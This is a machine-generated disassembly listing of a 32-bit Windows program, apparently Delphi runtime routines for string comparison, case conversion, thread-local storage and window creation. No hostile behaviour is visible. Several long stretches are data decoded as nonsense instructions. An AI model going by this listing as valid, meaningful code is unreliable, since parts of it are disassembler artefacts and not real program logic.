lea eax [ ebp - 0x4 ]
call sub_40458c
mov eax ebx
call sub_40478c
push eax
mov eax [ ebp - 0x4 ]
call sub_404200
inc eax
push eax
mov eax ebx
call sub_40477c
push eax
mov eax [ ebp - 0x4 ]
call sub_404400
pop ecx
pop edx
call sub_4059e0
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f40
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_40458c
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f94
sub_405ca0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405d37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404620
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d3e
lea eax [ ebp - 0x4 ]
call sub_404620
retn
mov eax ebx
call sub_404200
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404868
mov eax ebx
call sub_404200
push eax
mov eax [ ebp - 0x4 ]
call sub_40478c
inc eax
push eax
mov eax ebx
call sub_404400
push eax
mov eax [ ebp - 0x4 ]
call sub_40477c
pop ecx
pop edx
call sub_405abc
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404620
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404868
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40465c
sub_405d44
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405d87
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40476c
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405bf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d8e
lea eax [ ebp - 0x4 ]
call sub_404620
retn
sub_405d94
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404138
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_405300
push eax
call sub_4012ac
mov ecx eax
mov edx esp
mov eax esi
call sub_404030
jmp r-xdata
sub_405dec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405e52
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401274
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_4041b0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402ba0
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e59
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
xor ebx ebx
sub_405e60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405eaa
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405eb1
retn
mov eax rw-data
call sub_4029dc
mov eax rw-data
call sub_4029dc
mov eax rw-data
call sub_4029dc
call sub_401ae0
sub_405eb4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404d0c
call sub_402fac
test al al
je r-xdata
call sub_4030a0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40132c
mov [ rw-data ] eax
call sub_401324
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_402fdc
call sub_40129c
call sub_405dec
mov [ rw-data ] eax
call sub_401324
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40129c
call sub_405dec
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_40131c
mov [ rw-data ] eax
sub_405fbc
push ebx
call sub_405fb4
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405fa8
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403eb0
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403eb0
sub_406000
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405fbc
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_40604c
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405f88
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_406040
mov edx rw-data
mov eax ebx
call sub_403c04
pop ebx
retn
sub_406090
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4060b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4060bc
retn
sub_4060ec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_406108
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40612d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406134
retn
sub_406140
inc esp
popad
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
inc eax
popad
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
mov [ 0xffffffffc08b0048 ] eax
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
dec eax
add [ ebx + 0x3c25ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
xor al 0xa3
dec eax
add [ ebx + 0x3025ffc0 ] cl
mov [ 0xffffffffc08b0048 ] eax
jmp [ EnumCalendarInfoA@IAT ]
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
dec eax
add [ ebx + 0x2825ffc0 ] cl
mov [ 0xffffffffc08b0048 ] eax
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x4425ffc0 ] cl
mov [ 0xffffffffc08b0048 ] eax
jmp [ __import_lookup_table_6(kernel32:CreateEventA) ]
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FileTimeToDosDateTime
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
hlt
je r-xdata
mov eax eax
add eax [ eax + 0x61 ]
inc eax
add [ ebx + 0x1025ffc0 ] cl
mov [ 0xffffffffc08b0048 ] al
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
sub_406d1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402934
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402924
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406d74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402934
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402924
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406dcc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406ec1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406ee9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406ef0
retn
sub_406efc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406f21
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f28
retn
sub_406f34
xchg esi eax
dec eax
add al dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add al cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add cl cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dl cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bl cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ah cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add ch cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add dh cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add bh cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax + 0x640000ff ] dh
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] dh
xchg esi eax
dec eax
add [ edx + 0x640000ff ] dh
xchg esi eax
dec eax
add [ ebx + 0x640000ff ] dh
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] dh
dec eax
add [ ebp + 0x640000ff ] dh
xchg esi eax
dec eax
add [ esi + 0x640000ff ] dh
xchg esi eax
dec eax
add [ edi + 0x640000ff ] dh
xchg esi eax
dec eax
add [ eax + 0x640000ff ] bh
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] bh
xchg esi eax
dec eax
add [ edx + 0x640000ff ] bh
xchg esi eax
dec eax
add [ ebx + 0x640000ff ] bh
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] bh
dec eax
add [ ebp + 0x640000ff ] bh
xchg esi eax
dec eax
add [ esi + 0x640000ff ] bh
xchg esi eax
dec eax
add [ edi + 0x640000ff ] bh
xchg esi eax
dec eax
add [ eax + 0x640000ff ] ah
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] ah
xchg esi eax
dec eax
add [ edx + 0x640000ff ] ah
xchg esi eax
dec eax
add [ ebx + 0x640000ff ] ah
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] ah
dec eax
add [ ebp + 0x640000ff ] ah
xchg esi eax
dec eax
add [ esi + 0x640000ff ] ah
xchg esi eax
dec eax
add [ edi + 0x640000ff ] ah
xchg esi eax
dec eax
add [ eax + 0x640000ff ] ch
xchg esi eax
dec eax
add [ ecx + 0x640000ff ] ch
xchg esi eax
dec eax
add [ edx + 0x640000ff ] ch
xchg esi eax
dec eax
add [ ebx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_407239
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407240
retn
sub_407d5c
cmp eax 0x4700407d
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x7d ] dl
inc eax
add [ 0x2500407d ] bl
jge r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x33b40040 ] ah
inc eax
add [ eax + 0x59 ] dl
inc eax
add [ ecx + ebx * 2 + 0x40 ] bl
add al cl
xor eax [ eax ]
mov esp 0x6c004033
pop ecx
inc eax
add [ eax ] ah
xor [ eax ] eax
pushad
rol [ eax ] 0x1
and al 0x54
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x3500407d ] ch
jge r-xdata
push ebx
je r-xdata
add ah ah
jge r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
xor al 0x71
dec eax
add [ ebx + 0x34158910 ] cl
jno r-xdata
arpl [ eax + 0x72 ] bp
outsd
test al 0xff
dec [ ebx + 0x33c68bf0 ]
leave
mov edx ebx
call sub_402b80
mov eax esi
pop esi
pop ebx
push edx
popad
inc ebp
js r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407d5c3f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x7d
inc eax
add [ eax + 0x7d ] bh
inc eax
add [ eax ] al
add [ eax ] al
pushfd
test [ eax ] ecx
mov [ eax ] sub_407e6c
pop ebx
retn
add [ ebx + 0x48859c15 ] cl
add [ ebx + 0xa890448 ] cl
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026fc
call ebx
pop ebx
retn
insb
jne r-xdata
adc [ ecx + 0x48713415 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
retn
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
sub_407e0c
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407e28
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
pop edi
pop esi
pop ebx
retn
sub_407e4c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026dc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402b80
mov eax esi
pop esi
pop ebx
retn
sub_407e6c
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026fc
call ebx
pop ebx
retn
sub_407e98
push ebx
mov ebx eax
mov eax 0xc
call sub_4026dc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407e6c
pop ebx
retn
sub_407ed0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404200
mov ebx eax
mov eax edi
mov edx ebx
call sub_40458c
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407f0c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404200
mov ebx eax
mov eax edi
mov edx ebx
call sub_40458c
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407f48
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407f78
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407f98
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407fec
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407f98
test eax eax
jne r-xdata
sub_408010
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404200
mov ebx eax
mov eax esi
call sub_404400
mov edx eax
mov eax edi
mov ecx ebx
call sub_404030
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_408044
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404200
mov ebx eax
mov eax esi
call sub_404400
mov edx eax
mov eax edi
mov ecx ebx
call sub_404030
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_408078
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404200
push eax
mov eax esi
call sub_404400
push eax
mov eax ebx
call sub_404200
push eax
mov eax ebx
call sub_404400
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_4080b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404200
push eax
mov eax esi
call sub_404400
push eax
mov eax ebx
call sub_404200
push eax
mov eax ebx
call sub_404400
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408100
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_408120
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_404200
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403f40
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404460
pop ebp
pop edi
pop esi
pop ebx
retn
sub_408170
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov edi eax
xor eax eax
push ebp
push sub_4082c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx edi
mov eax edi
call sub_404200
mov esi eax
add esi ebx
mov eax edi
call sub_404200
mov [ ebp - 0xc ] eax
cmp esi ebx
jbe r-xdata
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_404138
mov eax [ ebp - 0x14 ]
call sub_404200
cmp eax [ ebp - 0xc ]
jne r-xdata
mov al [ ebx ]
mov edx eax
sub dl 0xa
je r-xdata
mov ebx edi
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
xor edx edx
call sub_404030
mov edi [ ebp - 0x8 ]
mov edi [ edi ]
cmp esi ebx
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx edi
call sub_403f94
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub dl 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4082d0
lea eax [ ebp - 0x14 ]
call sub_403f40
retn
mov al [ ebx ]
mov edx eax
sub dl 0xa
je r-xdata
inc ebx
inc [ ebp - 0xc ]
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub dl 0x3
je r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
jmp r-xdata
mov [ edi ] 0xd
inc edi
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
dec [ ebp - 0xc ]
jmp r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
inc ebx
jmp r-xdata
mov eax ebx
call sub_40c5b0
mov ebx eax
jmp r-xdata
cmp esi ebx
ja r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
cmp [ ebx ] 0xa
jne r-xdata
mov [ edi ] 0xd
inc edi
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
cmp esi ebx
ja r-xdata
inc ebx
jmp r-xdata
mov al [ ebx ]
mov [ edi ] al
inc edi
inc ebx
mov eax ebx
call sub_40c590
mov [ ebp - 0x10 ] eax
mov edx edi
mov eax ebx
mov ecx [ ebp - 0x10 ]
call sub_4028d8
add edi [ ebp - 0x10 ]
add ebx [ ebp - 0x10 ]
jmp r-xdata
sub_4082d8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_404200
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_404200
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
